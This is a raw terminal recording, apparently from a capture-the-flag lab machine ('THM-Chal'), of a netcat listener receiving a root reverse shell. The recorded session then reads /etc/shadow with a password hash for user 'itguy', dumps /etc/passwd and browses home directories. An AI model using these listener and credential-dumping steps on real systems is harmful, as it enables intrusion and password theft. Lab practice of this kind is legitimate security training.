@@ -1,0 +1,209 @@
+Script started on 2025-03-31 03:35:24+03:00 [COMMAND="rlwrap nc -lnvp 4444" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 4444 ...
+[Kconnect to [172.31.95.146] from (UNKNOWN) [172.31.80.1] 6045
+bash: cannot set terminal process group (1061): Inappropriate ioctl for device
+bash: no job control in this shell
+[Kroot@THM-Chal:/var/www/html/content/inc/ads# [Kroot@THM-Chal:/var/www/html/content/inc/ads# [K[?2004hroot@THM-Chal:/var/www/html/content/inc/ads# cd /root[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /root
+[Kcd /root
+root@THM-Chal:~# [Kroot@THM-Chal:~# [K[?2004hroot@THM-Chal:~# ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kroot.txt
+root@THM-Chal:~# [Kroot@THM-Chal:~# [K[?2004hroot@THM-Chal:~# cat /etc/shadow[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat /etc/shadow
+[Kcat /etc/shadow
+[Kroot:!:18228:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+messagebus:*:17954:0:99999:7:::
+uuidd:*:17954:0:99999:7:::
+lightdm:*:17954:0:99999:7:::
+whoopsie:*:17954:0:99999:7:::
+avahi-autoipd:*:17954:0:99999:7:::
+avahi:*:17954:0:99999:7:::
+dnsmasq:*:17954:0:99999:7:::
+colord:*:17954:0:99999:7:::
+speech-dispatcher:!:17954:0:99999:7:::
+hplip:*:17954:0:99999:7:::
+kernoops:*:17954:0:99999:7:::
+pulse:*:17954:0:99999:7:::
+rtkit:*:17954:0:99999:7:::
+saned:*:17954:0:99999:7:::
+usbmux:*:17954:0:99999:7:::
+itguy:$6$lEFmSzBi$M/BzAIH6sOmfmItrGxeLHdyrhb08KQyx8o0fDAytD2Xu9YKbZyYYqYXtnn0nnQrLRMed8GKJbvA.RwGM9HU3y0:18228:0:99999:7:::
+mysql:!:18229:0:99999:7:::
+vboxadd:!:18229::::::
+guest-3myc2b:!:18229::::::
+sshd:*:18229:0:99999:7:::
+root@THM-Chal:~# [Kroot@THM-Chal:~# [K[?2004hroot@THM-Chal:~# cat /etc/passwd[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat /etc/passwd
+[Kcat /etc/passwd
+[Kroot:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:110::/var/run/dbus:/bin/false
+uuidd:x:107:111::/run/uuidd:/bin/false
+lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
+whoopsie:x:109:117::/nonexistent:/bin/false
+avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
+speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
+pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
+saned:x:119:127::/var/lib/saned:/bin/false
+usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+itguy:x:1000:1000:THM-Chal,,,:/home/itguy:/bin/bash
+mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
+vboxadd:x:999:1::/var/run/vboxadd:/bin/false
+guest-3myc2b:x:998:998:Guest:/tmp/guest-3myc2b:/bin/bash
+sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
+root@THM-Chal:~# [Kroot@THM-Chal:~# [K[?2004hroot@THM-Chal:~# sudo systemctl status ssh[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo systemctl status ssh
+[Ksudo systemctl status ssh
+[K* ssh.service - OpenBSD Secure Shell server
+   Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)
+   Active: active (running) since Lu 2025-03-31 02:19:06 EEST; 1h 23min ago
+  Process: 942 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)
+ Main PID: 963 (sshd)
+   CGroup: /system.slice/ssh.service
+           `-963 /usr/sbin/sshd -D
+
+mar 31 02:35:35 THM-Chal sshd[2172]: fatal: Unable to negotiate with 10.8.61.245 port 1418: no matching host key type found. Their offer: ecdsa-sha2-nistp384 [preauth]
+mar 31 02:35:36 THM-Chal sshd[2174]: fatal: Unable to negotiate with 10.8.61.245 port 1342: no matching host key type found. Their offer: ecdsa-sha2-nistp521 [preauth]
+mar 31 02:35:38 THM-Chal sshd[2176]: Connection closed by 10.8.61.245 port 3318 [preauth]
+mar 31 03:09:57 THM-Chal sshd[2616]: Invalid user manager from 10.8.61.245
+mar 31 03:09:57 THM-Chal sshd[2616]: input_userauth_request: invalid user manager [preauth]
+mar 31 03:10:01 THM-Chal sshd[2616]: pam_unix(sshd:auth): check pass; user unknown
+mar 31 03:10:01 THM-Chal sshd[2616]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=10.8.61.245
+mar 31 03:10:03 THM-Chal sshd[2616]: Failed password for invalid user manager from 10.8.61.245 port 5560 ssh2
+mar 31 03:10:08 THM-Chal sshd[2616]: pam_unix(sshd:auth): check pass; user unknown
+mar 31 03:10:09 THM-Chal sshd[2616]: Failed password for invalid user manager from 10.8.61.245 port 5560 ssh2
+root@THM-Chal:~# [Kroot@THM-Chal:~# [K[?2004hroot@THM-Chal:~# ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al
+[Ktotal 28
+drwxr-x---  4 root root 4096 mar 31 02:20 .
+drwxr-xr-x 23 root root 4096 nov 29  2019 ..
+lrwxrwxrwx  1 root root    9 nov 29  2019 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 oct 22  2015 .bashrc
+drwx------  2 root root 4096 feb 27  2019 .cache
+drwxr-xr-x  2 root root 4096 nov 29  2019 .nano
+-rw-r--r--  1 root root  148 aug 17  2015 .profile
+-rw-r--r--  1 root root   38 nov 29  2019 root.txt
+root@THM-Chal:~# [Kroot@THM-Chal:~# [K[?2004hroot@THM-Chal:~# cd /home/itguy[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /home/itguy
+[Kcd /home/itguy
+root@THM-Chal:/home/itguy# [Kroot@THM-Chal:/home/itguy# [K[?2004hroot@THM-Chal:/home/itguy# ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[KDesktop
+Documents
+Downloads
+Music
+Pictures
+Public
+Templates
+Videos
+backup.pl
+examples.desktop
+mysql_login.txt
+user.txt
+root@THM-Chal:/home/itguy# [Kroot@THM-Chal:/home/itguy# [K[?2004hroot@THM-Chal:/home/itguy# ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al
+total 148
+drwxr-xr-x 18 itguy itguy 4096 nov 30  2019 .
+drwxr-xr-x  3 root  root  4096 nov 29  2019 ..
+-rw-------  1 itguy itguy 1630 nov 30  2019 .ICEauthority
+-rw-------  1 itguy itguy   53 nov 30  2019 .Xauthority
+lrwxrwxrwx  1 root  root     9 nov 29  2019 .bash_history -> /dev/null
+-rw-r--r--  1 itguy itguy  220 nov 29  2019 .bash_logout
+-rw-r--r--  1 itguy itguy 3771 nov 29  2019 .bashrc
+drwx------ 13 itguy itguy 4096 nov 29  2019 .cache
+drwx------ 14 itguy itguy 4096 nov 29  2019 .config
+drwx------  3 itguy itguy 4096 nov 29  2019 .dbus
+-rw-r--r--  1 itguy itguy   25 nov 29  2019 .dmrc
+drwx------  2 itguy itguy 4096 nov 29  2019 .gconf
+drwx------  3 itguy itguy 4096 nov 30  2019 .gnupg
+drwx------  3 itguy itguy 4096 nov 29  2019 .local
+drwx------  5 itguy itguy 4096 nov 29  2019 .mozilla
+-rw-------  1 itguy itguy  149 nov 29  2019 .mysql_history
+drwxrwxr-x  2 itguy itguy 4096 nov 29  2019 .nano
+-rw-r--r--  1 itguy itguy  655 nov 29  2019 .profile
+-rw-r--r--  1 itguy itguy    0 nov 29  2019 .sudo_as_admin_successful
+-rw-r-----  1 itguy itguy    5 nov 30  2019 .vboxclient-clipboard.pid
+-rw-r-----  1 itguy itguy    5 nov 30  2019 .vboxclient-display.pid
+-rw-r-----  1 itguy itguy    5 nov 30  2019 .vboxclient-draganddrop.pid
+-rw-r-----  1 itguy itguy   [K-rw-r-----  1 itguy itguy   [K-rw-r-----  1 itguy itguy    5 nov 30  2019 .vboxclient-seamless.pid
+-rw-------  1 itguy itguy   82 nov 30  2019 .xsession-errors
+-rw-------  1 itguy itguy   82 nov 29  2019 .xsession-errors.old
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 Desktop
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 Documents
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 Downloads
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 Music
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 Pictures
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 Public
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 Templates
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 Videos
+-rw-r--r-x  1 root  root    47 nov 29  2019 backup.pl
+-rw-r--r--  1 itguy itguy 8980 nov 29  2019 examples.desktop
+-rw-rw-r--  1 itguy itguy   16 nov 29  2019 mysql_login.txt
+-rw-rw-r--  1 itguy itguy   38 nov 29  2019 user.txt
+root@THM-Chal:/home/itguy# [Kroot@THM-Chal:/home/itguy# [K[?2004hroot@THM-Chal:/home/itguy# cat [7m.sudo_as_admin_successful[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[7mcat [27m.sudo_as_admin_successful[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat .sudo_as_admin_successful
+[Kcat .sudo_as_admin_successful
+[Kroot@THM-Chal:/home/itguy# [Kroot@THM-Chal:/home/itguy# [K[?2004hroot@THM-Chal:/home/itguy# cd D[K[K[K[Ktree[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004htree
+[Ktree
+[KThe program 'tree' is currently not installed. You can install it by typing:
+apt install tree
+[Kroot@THM-Chal:/home/itguy# [Kroot@THM-Chal:/home/itguy# [K[?2004hroot@THM-Chal:/home/itguy# apt install tree[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hapt install tree
+[Kapt install tree
+[K
+WARNING: apt does not have a stable CLI interface. Use with caution in scripts.
+
+Reading package lists...
+Building dependency tree...
+Reading state information...
+The following NEW packages will be installed:
+  tree
+[K[K[?2004h[?2004l[?2004h
+[K
+[?2004l
+Script done on 2025-03-31 03:46:38+03:00 [COMMAND_EXIT_CODE="1"]
